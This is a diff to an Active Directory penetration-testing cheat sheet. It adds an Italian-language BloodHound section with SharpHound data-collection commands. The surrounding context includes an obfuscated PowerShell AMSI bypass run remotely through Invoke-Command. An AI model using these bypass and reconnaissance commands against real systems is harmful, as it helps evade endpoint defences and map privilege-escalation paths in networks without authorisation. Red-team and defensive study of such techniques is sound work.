@@ -1,6 +1,7 @@
 # Active-Directory-Cheat-Sheet
 # Summary
 * [General](#General)
+* [BloodHound](#BloodHound)
 * [Domain Enumeration](#Domain-Enumeration)
 * [Local privilege escalation](#Local-privilege-escalation)
 * [Lateral Movement](#Lateral-Movement)
@@ -67,6 +68,16 @@ $v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Ge
 
 ```
 Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
+```
+
+# BloodHound
+### BloodHound è un'applicazione web Javascript a pagina singola con un database Neo4j alimentato da un raccoglitore di dati C#. BloodHound utilizza la teoria dei grafi per rivelare le relazioni nascoste e spesso indesiderate all'interno di un ambiente Active Directory o Azure. Gli aggressori possono utilizzare BloodHound per identificare facilmente percorsi di attacco altamente complessi che altrimenti sarebbero impossibili da identificare rapidamente. 
+### I difensori possono utilizzare BloodHound per identificare ed eliminare gli stessi percorsi di attacco. Sia i team blu che quelli rossi possono utilizzare BloodHound per acquisire facilmente una comprensione più approfondita delle relazioni di privilegio in un ambiente Active Directory o Azure.
+
+```
+https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+Import-Module SharpHound.ps1
+Invoke-BloodHound -CollectionMethod -All
 ```
 
 # Domain-Enumeration
